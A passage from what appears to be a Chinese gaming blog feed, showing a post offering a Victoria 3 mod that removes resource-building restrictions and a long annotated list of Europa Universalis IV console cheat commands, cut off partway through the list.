            <tag> P社 </tag>
            
            <tag> 十字军之王3 </tag>
            
            <tag> 攻略 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【V3MOD】移除资源建筑限制</title>
      <link href="/5ee8ed0e.html"/>
      <url>/5ee8ed0e.html</url>
      
        <content type="html"><![CDATA[<p>本mod移除了建造农业建筑和资源建筑的条件，即你可以在任何地方建造矿井，种植园什么的<br>（生产谷物的建筑仍需要可耕种土地防止自耕农完全没法消失）</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-41-614x1024.png"></p><p><a href="https://pan.baidu.com/s/1lGDDdc6WvTHzoMlXcBQxPQ?pwd=f9ei">网盘链接</a><br>提取码：f9ei</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mod </tag>
            
            <tag> P社 </tag>
            
            <tag> 维多利亚3 </tag>
            
            <tag> VIC3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欧陆风云4最新控制台秘籍</title>
      <link href="/c03197eb.html"/>
      <url>/c03197eb.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-39.png" alt="image"> <img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-40.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br></pre></td><td class="code"><pre><span class="line">absolutism [&lt;数值&gt;] [&lt;目标国家代码&gt; 可选]        添加目标国家的专制度。</span><br><span class="line">age [&lt;X&gt;]        设置当前游戏时代，0为地理大发现时代、1为宗教改革时代、2为专制主义时代、3为大革命时代。</span><br><span class="line">age_ruler [&lt;年龄&gt;] [&lt;国家代码&gt; 可选]        设置当前统治者的年龄。</span><br><span class="line">age_heir [&lt;年龄&gt;] [&lt;国家代码&gt; 可选]        设置当前继承人的年龄。</span><br><span class="line">age_consort [&lt;年龄&gt;] [&lt;国家代码&gt; 可选]        设置当前配偶的年龄。</span><br><span class="line">add_backer [&lt;省份ID&gt;]        这个省份变成国会当前议案的支持者。</span><br><span class="line">add_baseunrest [&lt;省份ID&gt;] [&lt;基础叛乱&gt;]        给一个省份添加基础叛乱度。</span><br><span class="line">add_cardinal        给一个天主教国家添加一个新的主教。</span><br><span class="line">add_cb [&lt;宣战理由ID&gt;] [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        对目标国家添加宣战理由。</span><br><span class="line">add_claim [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        对省份添加宣称。</span><br><span class="line">add_colonist [&lt;国家代码&gt;]        对目标国家添加一个殖民者。（有BUG，会将目标国家的殖民队强制降到1，下个月恢复）</span><br><span class="line">add_consort [&lt;目标国家代码&gt; 可选] [&lt;初始国家代码&gt; 可选]        给指定国家添加配偶。</span><br><span class="line">add_core [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        对指定省份添加该国核心。（默认Actor国家）</span><br><span class="line">add_devastation [&lt;省份ID&gt;] [&lt;荒废度&gt;]        增加省份荒废度。</span><br><span class="line">add_diplo [&lt;国家代码&gt; 可选]        增加外交谈判。</span><br><span class="line">add_faction [&lt;派系名称&gt;]        增加一个派系。</span><br><span class="line">add_heir [&lt;目标国家代码&gt; 可选]        换一个继承人（目前继承人将去世）。</span><br><span class="line">add_idea_group [&lt;理念组键值&gt;] [&lt;国家代码&gt; 可选]        增加指定理念组。</span><br><span class="line">add_interest [&lt;国家代码&gt;]        将指定国家列为感兴趣国家。</span><br><span class="line">add_issue [&lt;议题 tag&gt;]        在议会中增加一个议题。</span><br><span class="line">add_liberty_desire [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        增加独立倾向。</span><br><span class="line">add_local_autonomy [&lt;省份ID&gt;] [&lt;数值&gt; 可选]        给一个省份增加自治度。</span><br><span class="line">add_loyalty [&lt;目标阶层&gt;] [&lt;数值&gt;]        增加目标阶层的忠诚度。</span><br><span class="line">部分阶层标识如下：</span><br><span class="line"></span><br><span class="line">市民: estate_burghers</span><br><span class="line">贵族: estate_nobles</span><br><span class="line">教士: estate_church</span><br><span class="line">哥萨克：estate_cossacks</span><br><span class="line">游牧部落：estate_nomadic_tribes</span><br><span class="line">齐米：estate_dhimmi</span><br><span class="line">婆罗门：estate_brahmins</span><br><span class="line">耆那教徒：estate_jains</span><br><span class="line">马拉塔：estate_maratha</span><br><span class="line">拉杰普特：estate_rajput</span><br><span class="line">吠舍：estate_vaisyas</span><br><span class="line">add_missionary [&lt;国家代码&gt;]        对指定国家增加一个传教士。</span><br><span class="line">add_natives [&lt;省份ID&gt;] [&lt;数值&gt; 可选]        给指定省份加入殖民化的土著居民（[&lt;数值&gt;]×100）。</span><br><span class="line">add_opinion [&lt;Actor 国家代码&gt;] [&lt;目标国家代码&gt; 可选]        增加和所选国家的好感度关系。</span><br><span class="line">add_pa [&lt;国家代码&gt;]        目标国家增加牧首权威。</span><br><span class="line">add_permanent_claim [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        目标国家获得指定省份的永久宣称。</span><br><span class="line">add_pi [&lt;国家代码&gt;]        增加指定国家的教廷影响力。</span><br><span class="line">add_prosperity [&lt;省份ID&gt;] [&lt;繁荣度&gt;]        增加省份所在直属州的繁荣度。</span><br><span class="line">add_reformlevel [&lt;数值&gt; 可选]        实行帝国改革项目。</span><br><span class="line">add_republican_tradition [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        获得共和传统。</span><br><span class="line">add_to_curia_treasury [&lt;money&gt;]        增加教廷金库的总金额。</span><br><span class="line">add_trait [&lt;特质代码&gt;, &lt;heir&gt; 可选, &lt;consort&gt; 可选]        为君主/继承人/君主配偶增加君主特质。 注意:特质一定要全小写不能有空格 比如:Inspiring Leader 激励者 =&gt; 应写为 add_trait inspiring_leader 统治者永生：add_trait immortal</span><br><span class="line">add_unrest [&lt;CID Type&gt;] [&lt;CID Index&gt;] [&lt;Unrest&gt;]        给一个派别增加叛乱。</span><br><span class="line">使用方法：在开启debug模式后，进入国家页面的“稳定和扩张”分页，在“叛乱和潜在叛乱”这一项中，将鼠标悬停在叛军名称上即会显示type和id两项，前者为CID Type，后者为CID Index。</span><br><span class="line">adm [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        获得行政点数（默认值: 999）。</span><br><span class="line">admiral [&lt;火力&gt;] [&lt;冲击&gt;] [&lt;机动&gt;] [&lt;围城&gt;] [&lt;国家代码&gt; 可选]        增加一个海军将领/提督。</span><br><span class="line">ai_army_tick [&lt;国家代码&gt; 可选] [&lt;File name for logging&gt; 可选]        让AI智能重新评估所有的军事行动。</span><br><span class="line">ai_minister [&lt;0为军事, 1为外交, 2为贸易&gt;]        开/关特定类型的AI大臣。</span><br><span class="line">ai_plan_regions [&lt;国家代码&gt; 可选]        让AI重新评估所有区域分配。</span><br><span class="line">ai(ai) [&lt;目标国家代码&gt;]        开/关AI（不输入国家tag默认全部）。</span><br><span class="line">aiinvalid        将无效的AI命令数量输出至ai.log。</span><br><span class="line">aiview        显示AI额外信息。</span><br><span class="line">annex [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        不带核心吞并所选国家。</span><br><span class="line">army_drill [&lt;数值 [0.0, 100.0]&gt;] [&lt;国家代码&gt; 可选]        设置你所有部队的操练度。</span><br><span class="line">army_tradition [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        增加陆军传统。</span><br><span class="line">army_professionalism [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        设定陆军职业度。</span><br><span class="line">assimilate [&lt;省份ID&gt;] [&lt;目标国家代码&gt; 可选]        改变指定省份的拥有者同时添加核心，文化和宗教改变为与目标国家相同</span><br><span class="line">assert [&lt;触发条件名称&gt;]        调试检测触发条件。</span><br><span class="line">authority [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加一个国家的权威（因蒂崇拜 因蒂崇拜）。</span><br><span class="line">autosave        触发自动存档。</span><br><span class="line">balance        将平衡区域(省份数和国家税收、人力、发展等）输出至game.log文件。</span><br><span class="line">banner [&lt;省份 ID&gt;]]        在一个直属州筹募八旗兵。</span><br><span class="line">bearhaslanded [&lt;省份ID&gt; 可选]        扬马延出现在所选省份（不写省份ID随机出现）。</span><br><span class="line">bird_mana [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        获得外交点数（默认值：999）。</span><br><span class="line">canals        在地图上显示运河。</span><br><span class="line">cash [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        增加金钱（默认5000）。</span><br><span class="line">center_of_trade(cot) [贸易中心等级] [&lt;省份 ID&gt;]        创建或升降级一个贸易中心。</span><br><span class="line">change_culture_court [&lt;ruler/heir/consort/admadv/dipadv/miladv&gt;] [&lt;文化&gt;]        改变宫廷成员[统治者/继承人/配偶/行政大臣/外交大臣/军事大臣]的文化。</span><br><span class="line">change_religion [&lt;省份ID&gt;/&lt;国家代码&gt;] [&lt;宗教&gt;]        改变指定省份/国家宗教。</span><br><span class="line">宗教标识如下：</span><br><span class="line">天主教: catholic</span><br><span class="line">新教: protestant</span><br><span class="line">改革宗: reformed</span><br><span class="line">圣公宗: anglican</span><br><span class="line">胡斯派：hussite</span><br><span class="line">东正教: orthodox</span><br><span class="line">科普特正教: coptic</span><br><span class="line">逊尼派: sunni</span><br><span class="line">什叶派: shiite</span><br><span class="line">伊巴德派: ibadi</span><br><span class="line">上座部佛教: buddhism</span><br><span class="line">金刚乘佛教: vajrayana</span><br><span class="line">大乘佛教: mahayana</span><br><span class="line">儒教: confucianism</span><br><span class="line">神道教: shinto</span><br><span class="line">印度教: hinduism</span><br><span class="line">锡克教: sikhism</span><br><span class="line">泛灵教: animism</span><br><span class="line">萨满教: shamanism</span><br><span class="line">图腾崇拜: totemism</span><br><span class="line">因蒂: inti</span><br><span class="line">纳瓦特尔: nahuatl</span><br><span class="line">玛雅: mesoamerican_religion</span><br><span class="line">诺斯: norse_pagan_reformed</span><br><span class="line">长生天: tengri_pagan_reformed</span><br><span class="line">犹太教: jewish</span><br><span class="line">祆教: zoroastrian</span><br><span class="line">CK2转档游戏中额外的宗教：警告：如果你使用的命令没有指定的TAG或省份ID和使用不存在的宗教，游戏将崩溃。例如:：change_religion catolic or change_religion 1orthodox。</span><br><span class="line">change_religion_court [&lt;ruler/heir/consort/admadv/dipadv/miladv&gt;] [&lt;宗教&gt;]        改变宫廷成员[统治者/继承人/配偶/行政大臣/外交大臣/军事大臣]的宗教。</span><br><span class="line">check_save        检查存取耐受。</span><br><span class="line">常识统治吧，不列颠尼亚        church_power [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        为玩家增加教会力量。（新教 新教和 Anglican.png 圣公宗专属）</span><br><span class="line">clear        清空控制台。</span><br><span class="line">clearae [&lt;目标国家代码&gt;] [&lt;受影响国家代码&gt; 可选，留空代表所有]        清除目标国家侵略扩张。</span><br><span class="line">clearreforms [&lt;目标国家代码&gt; 可选]        移除所有的 政府改革。</span><br><span class="line">clr_consort_flag [&lt;目标国家代码&gt;] [&lt;Flag&gt;]        清理配偶的flag。</span><br><span class="line">clr_flag [&lt;Flag&gt;]        清理全局flag。</span><br><span class="line">clr_prov_flag [&lt;Flag&gt;] [&lt;Province&gt;]        清理一个省份的flag。</span><br><span class="line">collision(debug_collision)        切换显示类型。</span><br><span class="line">colonize [省份ID]        在一个未定居殖民并得到核心（并得到几点威望）。这个省份保持原来的文化和宗教。注意：在已定居省份同样有效并保持以前拥有者的核心。也适用于整个殖民地区，如 00_colonial_regions.txt 中所列：</span><br><span class="line">colonial_alaska 阿拉斯加</span><br><span class="line">colonial_australia 澳大利亚</span><br><span class="line">colonial_brazil 巴西</span><br><span class="line">colonial_california 加利福尼亚</span><br><span class="line">colonial_canada 加拿大</span><br><span class="line">colonial_colombia 哥伦比亚</span><br><span class="line">colonial_eastern_america 东美洲</span><br><span class="line">colonial_la_plata 拉普拉塔</span><br><span class="line">colonial_louisiana 路易斯安那</span><br><span class="line">colonial_mexico 墨西哥</span><br><span class="line">colonial_peru 秘鲁</span><br><span class="line">colonial_the_carribean 加勒比</span><br><span class="line">combat_dice [&lt;数值&gt; 可选]        将战斗骰子固定为指定数值。 -1为恢复正常掷骰子。</span><br><span class="line">combatsound        战争随机声音频率 显示0-50。</span><br><span class="line">control(controll) [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        改变一个省份的军事占领(非吞并省份)。</span><br><span class="line">corrupt [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        为所选国家设置腐败值。</span><br><span class="line">country_modifier [&lt;国家代码&gt;] [&lt;Modifier type&gt;]        显示国家修正。</span><br><span class="line">create_march [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        将一个国家变成“Actor国家”的卫戍国。</span><br><span class="line">ct        将计时器信息置入剪贴板。</span><br><span class="line">culture [&lt;省份ID&gt;]        将所选省份变成你的主流文化。</span><br><span class="line">cv        显示当前游戏的版本，并复制到剪贴板中</span><br><span class="line">date [date in format yyyy.mm.dd]        改变当前日期。</span><br><span class="line">debug_achievements_clear        抹除所有 EU4 Steam 成就。警告：无法还原！</span><br><span class="line">debug_info        开/关调试信息。</span><br><span class="line">debug_mode        显示debug模式下的一些内容。鼠标悬停在省份上时，显示省份ID,国家tag,和边界距离。</span><br><span class="line">debug_nogui        打开/关闭GUI。（请慎用，防止关闭GUI后恢复不能）</span><br><span class="line">debug_reload_areas        重新加载地区地图。</span><br><span class="line">debug_reload_regions        重新加载宗教地图。</span><br><span class="line">declare_war [&lt;attacker tag&gt;] [&lt;defender tag&gt;] [&lt;call willing allies&gt;]        在两个国家之间宣布战争（没有宣战理由）</span><br><span class="line">delete_wars [&lt;国家代码&gt; 可选]        删除战争（两国家）无需不移除停战。</span><br><span class="line">die(kill) [&lt;目标国家代码&gt; 可选]        所选地缘模拟器死亡。</span><br><span class="line">dip [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        获得 外交点数（默认值: 999）。</span><br><span class="line">diplocount        将全球外交统计输出至game.log。</span><br><span class="line">diplomacy_info        在控制台输出当前活跃的外交关系概要。</span><br><span class="line">disaster [灾难键值]        所选灾难增加100进度。</span><br><span class="line">discover [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        发现所选国家的首都。</span><br><span class="line">doom [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加一个国家的末日值。(Nahuatl.png 纳瓦特尔宗教）</span><br><span class="line">echo [Echo]        在控制台中回显参数（同样适用于注释脚本文件）</span><br><span class="line">economy []        将全球经济统计信息输出至game.log。</span><br><span class="line">embrace [&lt;省份ID&gt;] [&lt;思潮标识&gt; 可选]        所选省份接收一个思潮，如果思潮位置留空，所有思潮将会被接受。</span><br><span class="line">思潮标识如下：</span><br><span class="line">封建主义: feudalism</span><br><span class="line">文艺复兴: renaissance</span><br><span class="line">殖民主义: new_world_i</span><br><span class="line">印刷机应用: printing_press</span><br><span class="line">全球贸易: global_trade</span><br><span class="line">工厂生产: manufactories</span><br><span class="line">启蒙主义: enlightenment</span><br><span class="line">工业化：industrialization</span><br><span class="line">enable_game_controller        使控制器可用。</span><br><span class="line">epicfail [&lt;目标国家代码&gt; 可选]        让所有间谍在所选国家行动失败。</span><br><span class="line">event [事件ID] [&lt;目标国家代码&gt; 可选] [&lt;Option id&gt; 可选][&lt;省份代码&gt; （省份事件）可选]        执行一个事件。</span><br><span class="line">exhaust [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        改变你的厌战度。</span><br><span class="line">fast_colonize        快速殖民作弊开关。（对AI也生效）</span><br><span class="line">fast_diplo        快速外交/忽略派遣外交官时间。</span><br><span class="line">favors [&lt;目标国家代码&gt;] [&lt;数值&gt; 可选]        增加所选国家欠你的人情。</span><br><span class="line">findcommands [&lt;Search string&gt;]        寻找控制台指令。</span><br><span class="line">flagship_galley [&lt;Ship Name&gt;] [&lt;Ability 1&gt;] [&lt;Ability 2&gt;] [&lt;Ability 3&gt;]        创建一艘桨帆船作为旗舰。Ability键值与效果为：</span><br><span class="line">mass_load_cannons - 大量配置火炮，增加船只 50% 的大炮数量</span><br><span class="line">trade_route_map - 商路地图，+1 舰队中所有船只贸易竞争力（而非仅提供给轻型船只）</span><br><span class="line">command_aftercastle - 船尾指挥楼，+5% 舰队士气</span><br><span class="line">improved_crows_nest - 改良瞭望台，+3 接战宽度</span><br><span class="line">mortars - 臼炮，+1 封锁带来的围攻修正</span><br><span class="line">standardized_signal_book - 标准旗语通信手册，+1 舰队中各船只移动速度</span><br><span class="line">hull_sheating - 船罩，+50% 旗舰耐久度</span><br><span class="line">portuguese_navigators - 葡萄牙航海士，+100 舰队探索距离</span><br><span class="line">portuguese_bombardier - 葡萄牙炮术士，-40% 舰队海上炮击花费</span><br><span class="line">portuguese_trade_route_map - 葡萄牙商路地图，+2 舰队中每艘船的贸易竞争力</span><br><span class="line">spanish_grand_armada - 西班牙无敌舰队，-30% 舰队损耗</span><br><span class="line">spanish_treasure_fleet - 西班牙宝船舰队，+100%舰队猎杀海盗效率（猎杀海盗时火炮数量双倍计算）</span><br><span class="line">spanish_mass_load_cannons - 西班牙大量配置火炮，增加船只 100% 的大炮数量</span><br><span class="line">dutch_courage - 荷兰之勇，10% 舰队士气</span><br><span class="line">portuguese_corps_of_fusiliers - 葡萄牙火枪兵团，-66% 上船与登陆速度，+2 登陆时的作战优势（刚好可以抵消登陆惩罚）</span><br><span class="line">integrated_marines - 整合海军陆战队，-33% 上船与登陆速度</span><br><span class="line">scandinavian_flag_officers - 斯堪的纳维亚海军将官，+3% 海军提督每月从任务中获得技能的几率</span><br><span class="line">flag_officers - 国旗军官，+1% 海军提督每月从任务中获得技能的几率</span><br><span class="line">spare_jolly_roger - 备用海盗旗，+25.0% 舰队私掠效率</span><br><span class="line">captains_log - 船长日志，+100% 舰队在战斗中获得的海军传统 +100% 舰队在战斗中获得的威望</span><br><span class="line">flagship_heavy        创建一艘 重型船只作为旗舰。</span><br><span class="line">flagship_light        创建一艘 轻型船只作为旗舰。</span><br><span class="line">fervor [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        所选国家增加狂热（改革宗 改革宗）。</span><br><span class="line">federation_cohesion [&lt;数值&gt; 可选]        改变部落联盟的凝聚力。</span><br><span class="line">form_union [&lt;国家代码&gt;] [&lt;国家代码&gt; 可选]        与所选国家建立联合统治。</span><br><span class="line">fow(debug_fow) [&lt;省份ID&gt; 可选]        调节战争迷雾显示 开/关（填写省份ID目标为指定省份战争迷雾）。</span><br><span class="line">frenzy        强制开启列强狂热。</span><br><span class="line">frenzy_off        强制关闭列强狂热。</span><br><span class="line">fullscreen        截图。</span><br><span class="line">gamespeed(speed) [speed (0-5)]        设置当前游戏速度（0为暂停）。</span><br><span class="line">great_project [&lt;great project tag&gt;]        创建或摧毁伟大工程。</span><br><span class="line">god        开/关无敌模式。</span><br><span class="line">golden_age [&lt;国家代码&gt;]        开启该国的黄金时代（必须输入TAG）。</span><br><span class="line">Third Rome.pnggovernment_power(russian) [&lt;数值&gt; 可选]        给予满政府能力点数或特定点数。</span><br><span class="line">对新增于第三罗马的俄罗斯政体（俄罗斯公国/沙皇国）及新增于文明的摇篮的政体（马穆鲁克）均有效。</span><br><span class="line">harmonization [&lt;数值&gt; [0.0, 1.0]] [&lt;国家代码&gt;可选]        设置国家和谐进度（儒教 儒教专属）。</span><br><span class="line">harmony [&lt;数值&gt; 可选] [&lt;国家代码&gt;可选]        为玩家增加和谐度（儒教 儒教专属）。</span><br><span class="line">heir_history []        输出本国历任的统治者与继任者。</span><br><span class="line">help [command name]        输出所有的控制台指令或者一个特殊的指令描述。</span><br><span class="line">helphelp        显示“No help for you!”。</span><br><span class="line">helplog        将所有控制台命令帮助输出至game.log。</span><br><span class="line">horde_unity [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        设置游牧团结。</span><br><span class="line">ideadump        将有通用理念的国家输出至game.log。</span><br><span class="line">imperial_authority [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加神圣罗马帝国的帝国权威。</span><br><span class="line">imperial_incident [&lt;name&gt;]        开始一场神罗帝国事件。</span><br><span class="line">incident [&lt;事变代码&gt;, &lt;国家代码&gt; 可选]        为一个国家触发事变（神道教 神道教专属）。</span><br><span class="line">infinite_combat        无限战斗：一场战斗中双方士兵不受到任何战斗损伤，永远持续接战瞬间的状态。</span><br><span class="line">inflation [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加通货膨胀。</span><br><span class="line">统治吧，不列颠尼亚        innovativeness [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加创新度。（默认为100）</span><br><span class="line">insult [发送者] [接收者] [羞辱键值]        发送羞辱，羞辱键值为从1开始的数字。</span><br><span class="line">integrate [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        将指定国家整合进Actor国家（增加核心），即带核心吞并指定国家。</span><br><span 